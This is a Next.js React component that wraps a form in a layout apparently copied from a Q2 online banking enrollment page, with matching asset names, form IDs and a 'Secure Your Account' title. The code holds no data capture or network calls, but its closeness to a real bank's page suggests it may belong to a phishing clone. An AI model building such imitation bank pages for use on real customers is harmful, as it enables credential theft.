/* eslint-disable @next/next/no-img-element */
import Head from "next/head";
import React, { useEffect } from "react";

interface WrapperProps {
  children?: React.ReactNode;
  btnText?: string;
  loading?: boolean;
  onSubmit?: React.MouseEventHandler<HTMLButtonElement> | undefined;
  title?: string;
  subTitle?: string;
  hideBtn?: boolean;
}

export const Wrapper: React.FC<WrapperProps> = ({
  children,
  btnText,
  loading,
  onSubmit,
  hideBtn,
  title,
  subTitle,
}) => {
  useEffect(() => {
    const html = document.querySelector(`html`);
    html?.setAttribute(`class`, `wrapper-container`);

    return () => {
      html?.removeAttribute(`class`);
    };
  }, []);

  return (
    <>
      <Head>
        <title>Secure Your Account</title>
        <link href="/favicon.ico" />
      </Head>

      <style
  dangerouslySetInnerHTML={{
    __html:
      "html {\n    min-height: 100%\n}\n\n\n    body {\n        background-image: url('/images/desktop-background-78b95e19d363e7d201a42c657ddde12e.jpeg');\n        background-repeat: no-repeat;\n        background-size: cover;\n        background-attachment: fixed;\n        background-position: center right;\n    }\n\n\n    body {\n        background-color:  ;\n    }\n\n.container-fluid.heading {\n    width: 66.6666666666667%;\n    padding: 6% 0 0 0;\n}\n\n\n    .heading .col-xs-12 {\n        background-color: #ffffff;\n        padding: 1em;\n        border-radius: 8px 8px 0 0;\n    }\n\n@media screen and (max-width: 991px) {\n    .container-fluid.heading {\n        width: 83.3333333333333%;\n    }\n}\n\n@media screen and (max-width: 767px) {\n    .container-fluid.heading {\n        width: 100%;\n        padding: 0 0 0 0;\n    }\n}\n\n.container-fluid + .container {\n    background-color: #f6f6f6;\n}\n\n.outage-msg{\n    font-size: 19px;\n}\n\n"
  }}
/>


      <div className="container-fluid heading">
        <div className="col-xs-12" style={{ textAlign: "center" }}>
          <img
            id="logo-large"
            src="/images/logo_large-e51445d8eeb9217b6aea61bb2b2af5dc.png"
            style={{ maxWidth: "100%", height: "auto" }}
            alt="Q2 CI Environment"
          />
        </div>
      </div>

      <div className="container col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-12">
        <div
          className="row"
          style={{
            marginBottom: `40px`,
          }}
        >
          <div className="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
            <h3 id="page_title">{title || `Online Banking Enrollment`}</h3>
            <p id="page_message" className="page-message">
              {subTitle}
            </p>
            <ul
              id="nav-tabs"
              className="nav nav-tabs"
              role="tablist"
              style={{ display: "none" }}
            />
          </div>
          <div className="clearfix col-xs-12 col-sm-10 col-sm-offset-1">
            <div id="q2-form-fields" className="tab-content">
              <div>
                <form
                  className="q2-form fv-form fv-form-bootstrap"
                  id="OnlineEnrollment_personal"
                >
                  <div className="col-xs-12 groupHeading" id="section0">
                    <div className=""> </div>
                  </div>
                  {children}
                  <div className="col-xs-12 ">
                    <div className="line">
                      <p style={{ marginTop: 10 }}> </p>
                    </div>
                  </div>
                  {!hideBtn ? (
                    <button
                      className="btn btn-primary pull-right"
                      id="submit_button_OnlineEnrollment_personal"
                      disabled={loading}
                      onClick={onSubmit}
                    >
                      {btnText || `Continue`}
                    </button>
                  ) : null}
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div
        role="contentinfo"
        className="footer col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-12"
      />
    </>
  );
};
